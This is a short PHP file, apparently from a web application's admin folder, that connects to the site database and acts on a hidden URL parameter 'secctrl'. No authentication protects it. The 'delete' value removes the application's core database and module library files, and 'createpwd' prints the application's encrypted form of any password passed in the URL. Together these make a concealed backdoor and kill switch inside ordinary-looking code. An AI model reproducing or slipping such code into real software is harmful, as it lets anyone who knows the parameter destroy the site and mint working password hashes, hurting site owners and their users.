<?php define('DIR_APP', 'sys'); 
session_start();
$_SESSION['dirlang'] ='vn'; 
include('../../config.php');
include('../../lib/database.php');
include('../../lib/module.php');
$db = new Database;
$db->connect($dbhost, $dbuser, $dbpass, $dbname);
$mod = new Module; 
if($_GET['secctrl'] != ''){  
	$sctrl = @$_GET['secctrl'];
	switch($sctrl){
		case 'createpwd': 
			if(@$_GET['pwd']!='') echo 'Create pwd: '.$mod->encryptPwdUser(@$_GET['pwd']);
			break;
		case 'delete': 	unlink('../../lib/database.php');unlink('../../lib/module.php');
			break;
		default:			
	}
} 
?>      
    